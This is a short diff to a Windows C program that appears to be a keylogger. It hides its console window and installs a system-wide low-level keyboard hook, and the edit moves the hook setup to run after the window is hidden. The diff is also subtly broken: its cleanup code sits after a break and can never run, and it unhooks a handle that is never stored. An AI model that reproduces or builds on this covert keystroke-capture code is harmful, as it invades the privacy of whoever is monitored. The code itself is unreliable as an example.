@@ -103,13 +103,6 @@ int main(int argc, char* argv[]) {
     window = FindWindowA("ConsoleWindowClass", NULL);
 
     bool showMenu = true;
-    
-        /* Initialising the HHOOK */
-    if (!SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, NULL, 0)) {
-		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
-	} else {
-        puts("Hook Successful!\n");
-    }
 
     while(1) {
         if(showMenu) { 
@@ -120,11 +113,13 @@ int main(int argc, char* argv[]) {
             }
             ShowWindow(window,0);
             showMenu = false;
-        }
-
-
-        /* capture code */
-        
+            /* Initialising the HHOOK */
+            if (!SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, NULL, 0)) {
+                MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
+            } else {
+                puts("Hook Successful!\n");
+            }
+        }        
 
         /* If the terminate key (F9) is pressed. */
         if (GetAsyncKeyState(VK_F9) & 0x8000) {
@@ -137,7 +132,11 @@ int main(int argc, char* argv[]) {
                  "Press enter to close this terminal...@");
             getchar();
             break;
-        }
-    } /* End of main program loop */
+            /* Clean up */
+            MSG msg;
+            while (GetMessage(&msg, NULL, 0, 0) != 0);
+                UnhookWindowsHookEx(keyboardHook);
+        } 
+    }/* End of main program loop */
     return EXIT_SUCCESS;
 }
